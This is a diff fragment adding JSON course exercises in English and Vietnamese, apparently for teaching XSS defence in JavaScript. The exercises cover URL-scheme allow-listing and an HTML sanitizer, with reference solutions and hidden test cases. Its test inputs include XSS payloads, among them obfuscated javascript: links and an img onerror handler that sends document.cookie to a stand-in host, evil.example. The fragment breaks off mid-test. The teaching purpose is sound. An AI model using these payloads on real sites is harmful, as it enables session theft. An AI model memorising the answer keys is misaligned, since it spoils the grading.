+          "code": "/** Return href if it is a safe http(s)/mailto link (absolute or relative), otherwise \"#\". */\nfunction safeHref(href) {\n  // Write your solution here\n  if (href.startsWith('javascript:')) return '#';\n  return href;\n}\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "answer.js",
+          "language": "javascript",
+          "code": "// Reference solution\nfunction safeHref(href) {\n  // Do NOT test the raw string with a regex: browsers drop leading spaces/control characters and tabs inside the\n  // scheme, so \" \\tjava\\tscript:alert(1)\" still runs. Let the URL parser normalise it exactly like a browser would.\n  let url;\n  try {\n    url = new URL(String(href), 'https://cuongthai.com/');   // relative links resolve against our own page\n  } catch {\n    return '#';                                               // not a URL at all\n  }\n  // Allow-list of schemes, never a deny-list: javascript:, data:, vbscript:, file:… all fail this one check.\n  return ['http:', 'https:', 'mailto:'].includes(url.protocol) ? String(href) : '#';\n}\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p>The browser decides what a link does after normalising it, so the check must normalise the same way — the WHATWG URL parser in Node and in the browser strips leading control characters and tabs, and lower-cases the scheme (verified on Node 22: <code>\" \\tjavascript:alert(1)\"</code> parses to protocol <code>javascript:</code>). Checking the protocol against a short allow-list then covers every executable scheme at once.</p>",
+      "solutionExplanationHtmlVi": "<p>Trình duyệt quyết định link làm gì SAU khi chuẩn hoá nó, nên phép kiểm phải chuẩn hoá cùng cách — bộ phân tích URL WHATWG trong Node và trình duyệt bỏ ký tự điều khiển đầu chuỗi, tab, và viết thường scheme (kiểm trên Node 22: <code>\" \\tjavascript:alert(1)\"</code> ra protocol <code>javascript:</code>). So giao thức với một danh sách trắng ngắn thì bao luôn mọi scheme chạy được mã.</p>",
+      "diagramMermaid": null,
+      "referenceUrl": null,
+      "testsJson": {
+        "loai": "js",
+        "phienBan": 1,
+        "tepChinh": "answer.js",
+        "tepNap": [
+          "answer.js"
+        ],
+        "kiem": [
+          {
+            "moTa": {
+              "en": "An https link",
+              "vi": "Một link https"
+            },
+            "goi": "safeHref('https://cuongthai.com/notes/7')",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "https://cuongthai.com/notes/7"
+          },
+          {
+            "moTa": {
+              "en": "javascript: is refused",
+              "vi": "javascript: bị từ chối"
+            },
+            "goi": "safeHref('javascript:alert(document.cookie)')",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "#"
+          },
+          {
+            "moTa": {
+              "en": "Relative links and mailto",
+              "vi": "Link tương đối và mailto"
+            },
+            "goi": "[safeHref('/notes/1'), safeHref('#top'), safeHref('mailto:an@cuongthai.com')]",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": [
+              "/notes/1",
+              "#top",
+              "mailto:an@cuongthai.com"
+            ]
+          },
+          {
+            "moTa": {
+              "en": "Hidden case 4",
+              "vi": "Ca ẩn 4"
+            },
+            "goi": "[safeHref('JaVaScRiPt:alert(1)'), safeHref(' \\tjavascript:alert(1)'), safeHref('java\\tscript:alert(1)')]",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": [
+              "#",
+              "#",
+              "#"
+            ],
+            "an": true
+          },
+          {
+            "moTa": {
+              "en": "Hidden case 5",
+              "vi": "Ca ẩn 5"
+            },
+            "goi": "[safeHref('data:text/html,<script>alert(1)</script>'), safeHref('vbscript:msgbox(1)'), safeHref('http://')]",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": [
+              "#",
+              "#",
+              "#"
+            ],
+            "an": true
+          },
+          {
+            "moTa": {
+              "en": "Hidden case 6",
+              "vi": "Ca ẩn 6"
+            },
+            "goi": "[safeHref('http://example.com/a?b=c'), safeHref('notes/2'), safeHref('//evil.example/x')]",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": [
+              "http://example.com/a?b=c",
+              "notes/2",
+              "//evil.example/x"
+            ],
+            "an": true
+          }
+        ]
+      },
+      "gradeKind": "js",
+      "kind": "practice",
+      "mistakesJson": [
+        {
+          "loi": "<code>href.startsWith(\"javascript:\")</code> — fails on upper case, leading spaces and a tab in the middle of the word.|||<code>href.startsWith(\"javascript:\")</code> — trượt với chữ hoa, khoảng trắng đầu và tab giữa chữ."
+        },
+        {
+          "loi": "A deny-list (block javascript:) instead of an allow-list: data: and vbscript: walk through.|||Danh sách đen (chặn javascript:) thay vì danh sách trắng: data: và vbscript: lọt qua."
+        },
+        {
+          "loi": "Returning the parsed <code>url.href</code>: relative links become absolute and the test expects the original text.|||Trả <code>url.href</code> đã phân tích: link tương đối thành tuyệt đối trong khi đề yêu cầu chữ gốc."
+        }
+      ],
+      "glossaryJson": [
+        {
+          "en": "scheme",
+          "vi": "lược đồ URL",
+          "giaiThich": "phần trước dấu hai chấm: https, mailto, javascript"
+        },
+        {
+          "en": "normalisation",
+          "vi": "chuẩn hoá",
+          "giaiThich": "đưa chuỗi về dạng trình duyệt thật sự hiểu"
+        }
+      ]
+    },
+    {
+      "title": "Sanitize a parsed note with an allow-list",
+      "language": "javascript",
+      "difficulty": "HARD",
+      "estimatedMinutes": 30,
+      "points": 30,
+      "concepts": [
+        "XSS",
+        "sanitizing",
+        "recursion"
+      ],
+      "prerequisites": [],
+      "tags": [
+        "nodejs"
+      ],
+      "problemHtml": "<p>The lesson: sanitizing means \"parse it into a DOM, walk it, delete everything not on the allow-list, serialise it back\" — keep the markup that carries <i>meaning</i>, drop the markup that carries <i>behaviour</i>. The parsing is done for you: a note arrives as a tree, an array whose items are either a <b>string</b> (text) or an <b>element</b> <code>{ tag, attrs?, children? }</code>. Write <code>sanitize(nodes)</code> → HTML string:</p>\n<ul><li>text is escaped (<code>&amp; &lt; &gt; \" '</code>);</li>\n<li>allowed tags (case-insensitive, output lower-case): <code>p b i em strong a ul ol li br code</code>. <code>br</code> is written <code>&lt;br&gt;</code> with no closing tag;</li>\n<li>dropped <b>with their whole content</b>: <code>script style iframe object embed svg math noscript template</code>;</li>\n<li>any other tag (<code>div</code>, <code>span</code>, <code>img</code>…) is removed but its children are kept (unwrap);</li>\n<li>every attribute is dropped, except <code>href</code> on <code>a</code> when it is an <code>http:</code>/<code>https:</code>/<code>mailto:</code> link (relative links allowed, as in the previous exercise); its value is escaped and written <code>href=\"…\"</code>.</li></ul>\n<p>Example: <code>[{tag:'p', children:['Hi ', {tag:'b', attrs:{onclick:'x()'}, children:['An']}]}]</code> → <code>&lt;p&gt;Hi &lt;b&gt;An&lt;/b&gt;&lt;/p&gt;</code>.</p><p><i>Graded in your browser: there is no real Express, network, Buffer or <code>crypto</code> here. The tests call your function with small fake objects (a fake <code>res</code> that records <code>status()</code>, headers and <code>json()</code>; fake stores with async methods), exactly the way Chapter 14 tests a handler without a server. <code>Date.now()</code> and timers run on a virtual clock, so waiting costs no real time.</i></p>\n<h4>Requirements</h4>\n<ul>\n  <li>Return the value; do not print it.</li>\n  <li>Do not modify the arguments.</li>\n</ul>",
+      "problemHtmlVi": "<p>Bài học: sanitize nghĩa là \"phân tích thành DOM, đi qua nó, xoá mọi thứ không có trong danh sách trắng, ghi lại thành chuỗi\" — giữ markup mang <i>ý nghĩa</i>, bỏ markup mang <i>hành vi</i>. Phần phân tích đã làm sẵn: ghi chú tới dưới dạng cây, một mảng mà mỗi phần tử là <b>chuỗi</b> (chữ) hoặc <b>phần tử</b> <code>{ tag, attrs?, children? }</code>. Viết <code>sanitize(nodes)</code> → chuỗi HTML:</p>\n<ul><li>chữ được escape (<code>&amp; &lt; &gt; \" '</code>);</li>\n<li>thẻ được phép (không phân biệt hoa thường, ghi ra chữ thường): <code>p b i em strong a ul ol li br code</code>. <code>br</code> ghi là <code>&lt;br&gt;</code>, không có thẻ đóng;</li>\n<li>bỏ <b>kèm toàn bộ nội dung</b>: <code>script style iframe object embed svg math noscript template</code>;</li>\n<li>thẻ khác (<code>div</code>, <code>span</code>, <code>img</code>…) bị bỏ nhưng giữ con của nó (gỡ vỏ);</li>\n<li>bỏ mọi thuộc tính, trừ <code>href</code> trên <code>a</code> khi là link <code>http:</code>/<code>https:</code>/<code>mailto:</code> (cho phép link tương đối, như bài trước); giá trị được escape và ghi <code>href=\"…\"</code>.</li></ul><p><i>Chấm ngay trong trình duyệt: ở đây không có Express thật, mạng, Buffer hay <code>crypto</code>. Bộ kiểm gọi hàm của bạn với các object GIẢ nhỏ (một <code>res</code> giả ghi lại <code>status()</code>, header và <code>json()</code>; kho giả có hàm async), đúng cách Chương 14 kiểm một handler mà không cần máy chủ. <code>Date.now()</code> và hẹn giờ chạy trên đồng hồ ẢO nên chờ không tốn thời gian thật.</i></p>\n<h4>Yêu cầu</h4>\n<ul>\n  <li>Trả về giá trị, đừng in ra.</li>\n  <li>Không sửa các đối số.</li>\n</ul>",
+      "inputSpec": null,
+      "outputSpec": null,
+      "constraints": "",
+      "examplesJson": [
+        {
+          "input": "sanitize([{ tag: 'p', children: ['Hi ', { tag: 'b', attrs: { onclick: 'x()' }, children: ['An'] }] }])",
+          "output": "\"<p>Hi <b>An</b></p>\"",
+          "explanation": "The first sample case (more cases run when you press Run; hidden ones only on Submit).|||Ca mẫu đầu tiên (Chạy thử chạy thêm các ca hiện; ca ẩn chỉ chạy khi Nộp)."
+        }
+      ],
+      "hintsJson": [
+        "Write a recursive <code>walk(list)</code> that maps each node to a string and joins them.|||Viết hàm đệ quy <code>walk(list)</code> biến mỗi nút thành chuỗi rồi nối lại.",
+        "Three branches per element: in DROP → <code>\"\"</code>; not allowed → <code>walk(children)</code>; allowed → open tag + <code>walk(children)</code> + close tag.|||Ba nhánh cho mỗi phần tử: thuộc DROP → <code>\"\"</code>; không được phép → <code>walk(children)</code>; được phép → thẻ mở + <code>walk(children)</code> + thẻ đóng.",
+        "Never copy attributes in a loop — build the one attribute you allow, after checking it.|||Đừng chép thuộc tính bằng vòng lặp — dựng đúng một thuộc tính bạn cho phép, sau khi kiểm."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "answer.js",
+          "language": "javascript",
+          "code": "/** Turn a parsed note tree into safe HTML using an allow-list. */\nfunction sanitize(nodes) {\n  // Write your solution here\n  return nodes.map((n) => {\n    if (typeof n === 'string') return n;\n    if (n.tag === 'script') return '';\n    const attrs = Object.entries(n.attrs || {}).filter(([k]) => !k.startsWith('on')).map(([k, v]) => ' ' + k + '=\"' + v + '\"').join('');\n    return '<' + n.tag + attrs + '>' + sanitize(n.children || []) + '</' + n.tag + '>';\n  }).join('');\n}\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "answer.js",
+          "language": "javascript",
+          "code": "// Reference solution\nfunction sanitize(nodes) {\n  const ALLOWED = new Set(['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br', 'code']);\n  // Elements whose CONTENT is code or can smuggle markup: drop the element and everything inside it.\n  const DROP = new Set(['script', 'style', 'iframe', 'object', 'embed', 'svg', 'math', 'noscript', 'template']);\n  const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\"/g, '&quot;').replace(/'/g, '&#39;');\n  const okHref = (h) => {\n    try { return ['http:', 'https:', 'mailto:'].includes(new URL(String(h), 'https://cuongthai.com/').protocol); } catch { return false; }\n  };\n  const walk = (list) => list.map((n) => {\n    if (typeof n === 'string') return esc(n);                    // text is always escaped on the way out\n    const tag = String(n.tag).toLowerCase();\n    const kids = n.children || [];\n    if (DROP.has(tag)) return '';                                 // behaviour, not meaning: gone, children too\n    if (!ALLOWED.has(tag)) return walk(kids);                     // unknown wrapper (div, span, font): keep the text\n    let attrs = '';\n    // The ONLY attribute kept: href on <a>, and only when it is a safe scheme. on*, style, src… never survive.\n    if (tag === 'a' && n.attrs && n.attrs.href !== undefined && okHref(n.attrs.href)) attrs = ' href=\"' + esc(n.attrs.href) + '\"';\n    if (tag === 'br') return '<br>';                              // void element: no closing tag, no children\n    return '<' + tag + attrs + '>' + walk(kids) + '</' + tag + '>';\n  }).join('');\n  return walk(nodes);\n}\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p>An allow-list sanitizer cannot be bypassed by a tag or attribute nobody thought of, because anything unknown is removed by default. Dropping executable containers with their content, unwrapping harmless unknown wrappers, and rebuilding the single allowed attribute after a URL check is exactly what the lesson saw sanitize-html and DOMPurify do: <code>&lt;img src=x onerror=…&gt;</code> loses the handler, <code>&lt;a href=\"javascript:…\"&gt;</code> becomes a bare <code>&lt;a&gt;</code>, the legitimate note survives untouched. Serialising from a tree — never editing the string — is why there is no \"nested script\" trick.</p>",
+      "solutionExplanationHtmlVi": "<p>Bộ sanitize theo danh sách trắng không thể bị vượt bởi một thẻ hay thuộc tính không ai nghĩ tới, vì cái lạ mặc định bị bỏ. Bỏ hẳn vật chứa mã kèm nội dung, gỡ vỏ các thẻ lạ vô hại, và dựng lại đúng một thuộc tính được phép sau khi kiểm URL chính là điều bài thấy sanitize-html và DOMPurify làm: <code>&lt;img src=x onerror=…&gt;</code> mất trình xử lý, <code>&lt;a href=\"javascript:…\"&gt;</code> thành <code>&lt;a&gt;</code> trơn, ghi chú hợp lệ giữ nguyên. Ghi ra từ một cây — không bao giờ sửa chuỗi — là lý do không có mẹo \"script lồng nhau\".</p>",
+      "diagramMermaid": null,
+      "referenceUrl": null,
+      "testsJson": {
+        "loai": "js",
+        "phienBan": 1,
+        "tepChinh": "answer.js",
+        "tepNap": [
+          "answer.js"
+        ],
+        "kiem": [
+          {
+            "moTa": {
+              "en": "Handlers are dropped, meaning is kept",
+              "vi": "Bỏ trình xử lý, giữ ý nghĩa"
+            },
+            "goi": "sanitize([{ tag: 'p', children: ['Hi ', { tag: 'b', attrs: { onclick: 'x()' }, children: ['An'] }] }])",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "<p>Hi <b>An</b></p>"
+          },
+          {
+            "moTa": {
+              "en": "img onerror: no tag, no handler",
+              "vi": "img onerror: không thẻ, không trình xử lý"
+            },
+            "goi": "sanitize([{ tag: 'img', attrs: { src: 'x', onerror: \"fetch('https://evil.example/?c='+document.cookie)\" } }, 'after'])",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: 